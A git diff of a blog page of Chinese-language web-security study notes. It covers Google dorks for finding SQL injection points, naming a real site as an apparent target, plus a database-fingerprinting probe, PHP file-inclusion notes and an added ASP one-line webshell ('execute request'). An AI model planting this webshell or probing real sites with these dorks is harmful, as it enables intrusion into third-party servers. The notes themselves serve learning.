@@ -30,7 +30,7 @@ jspJavaServerPage: HttpServelet的扩展tomcat: servlet容器apache :C语言实�
 Google Hacking语法grammar
 intext:关键字 //now:和普通的差不多作用
 intitle:后台登录 //查询的是html的t">
-<meta property="og:updated_time" content="2015-10-30T13:07:27.128Z">
+<meta property="og:updated_time" content="2015-11-03T15:52:02.611Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="A1exlism">
 <meta name="twitter:description" content="本地服务器搭建
@@ -104,7 +104,7 @@ intitle:后台登录 //查询的是html的t">
 		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
 		
   <p class="article-time">
-    <time datetime="2015-10-30T13:07:27.128Z" itemprop="datePublished"> 发表于 10-30-2015</time>
+    <time datetime="2015-11-03T15:52:02.611Z" itemprop="datePublished"> 发表于 11-03-2015</time>
     
   </p>
 </header>
@@ -131,10 +131,16 @@ intitle:后台登录 //查询的是html的t">
 <li>寻找sql注入点   //想了一下,可以借助google的searchtool来尝试搞一些旧一点的站= =<br><code>insite: inurl:php?id=</code><br>got:<a href="http://www.cobranet.org/about.php?id=1" target="_blank" rel="external">cobranet.org</a>  //感觉洞还挺大的233</li>
 <li>搜索默认数据库名字<br><code>...mdb</code></li>
 </ol>
-<h2 id="Sql">Sql</h2><p>判断后台数据类型<br>and user &gt; 0<br>  access -&gt;Microsoft JET Database Engine<br>  ODBC SQL<br>表-&gt;列-&gt;列长度-&gt;</p>
+<h2 id="Sql">Sql</h2><p>判断后台数据类型<br>and user &gt; 0<br>  access -&gt;Microsoft JET Database Engine<br>  ODBC SQL<br>表-&gt;列-&gt;列长度-&gt;<br>————————-?——————-</p>
 <h3 id="php文件包含漏洞">php文件包含漏洞</h3><h4 id="函数介绍">函数介绍</h4><p><a href="http://php.net/manual/zh/function.include.php" target="_blank" rel="external">include()</a></p>
 <h4 id="test">test</h4><p>  google -&gt;php?page=</p>
 <h3 id="在windows平台上">在windows平台上</h3><p>php的某些函数获取文件时，可以使用&lt;代替其他字符进行猜解 //具体版本暂时不清楚</p>
+<h2 id="ASP">ASP</h2><p>Active X<br>Server  VBScript JavaScript<br>Pages HTML</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">runat</span>=<span class="value">"Server"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">runat表示该文本在服务器端执行</span><br></pre></td></tr></table></figure>
+<p>IIS默认脚本语言 VBScript<br>ASP小例子<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">title</span>&gt;</span>ASP 示例<span class="tag">&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">%</span></span><br><span class="line"><span class="attribute">dim</span> <span class="attribute">color1</span>,<span class="attribute">color2</span>,<span class="attribute">color3</span></span><br><span class="line"><span class="attribute">color1</span>=<span class="value">"green"</span></span><br><span class="line"><span class="attribute">color2</span>=<span class="value">"blue"</span></span><br><span class="line"><span class="attribute">color3</span>=<span class="value">"red"</span></span><br><span class="line">%&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">font</span> <span class="attribute">color</span>=<span class="value">&lt;%</span> =<span class="value">color1</span> %&gt;</span>&gt;我是绿色的文字呢<span class="tag">&lt;/<span class="title">font</span>&gt;</span><span class="tag">&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">B</span>&gt;</span><span class="tag">&lt;<span class="title">font</span> <span class="attribute">color</span>=<span class="value">&lt;%</span> =<span class="value">color2</span> %&gt;</span>&gt;我是蓝色的文字呢<span class="tag">&lt;/<span class="title">font</span>&gt;</span><span class="tag">&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">I</span>&gt;</span><span class="tag">&lt;<span class="title">font</span> <span class="attribute">color</span>=<span class="value">&lt;%</span> =<span class="value">color3</span> %&gt;</span>&gt;我是红色的文字呢<span class="tag">&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>ASP 包含的主要内置对象有 Request、Response、Server、Session、Application .etc</p>
+<p>(2)、FileSystemObject 对 象</p>
+<h2 id="一句话木马">一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute request(<span class="string">"balue"</span>)%&gt;  <span class="comment">//asp</span></span><br><span class="line">request 保证了client代码可以在服务器执行</span><br></pre></td></tr></table></figure>
   
 	</div>
 		<footer class="article-footer clearfix">
